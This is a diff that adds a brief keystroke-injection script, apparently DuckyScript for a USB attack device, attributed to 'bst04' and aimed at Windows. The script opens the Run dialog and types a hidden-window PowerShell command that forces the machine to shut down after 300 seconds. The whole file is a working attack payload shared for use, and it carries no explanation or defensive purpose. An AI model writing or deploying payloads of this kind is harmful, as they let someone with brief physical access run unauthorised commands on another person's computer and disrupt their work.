@@ -1,0 +1,7 @@
+REM Payload made by bst04
+REM Windows Devices
+DELAY 500
+GUI r
+DELAY 500
+STRINGLN powershell -w h -NoP  shutdown -s -t 300
+
